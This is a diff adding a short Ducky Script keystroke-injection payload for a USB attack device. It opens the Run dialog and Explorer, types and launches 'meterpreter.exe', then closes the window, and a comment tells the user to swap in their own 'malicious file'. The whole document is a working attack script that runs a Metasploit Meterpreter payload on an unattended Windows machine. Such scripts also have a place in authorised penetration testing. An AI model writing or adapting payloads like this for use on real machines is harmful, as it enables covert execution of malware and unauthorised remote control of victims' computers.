@@ -1,0 +1,20 @@
+REM starts the specified program via file explorer
+DELAY 1000
+GUI r
+DELAY 300
+STRING explorer.exe
+DELAY 100
+ENTER
+DELAY 600
+REM 
+REM replace this next string with your malicious file
+STRING meterpreter.exe
+REM
+DELAY 100
+ENTER
+DELAY 5000
+DOWNARROW 1
+DELAY 300
+ENTER
+DELAY 2000
+ALT F4
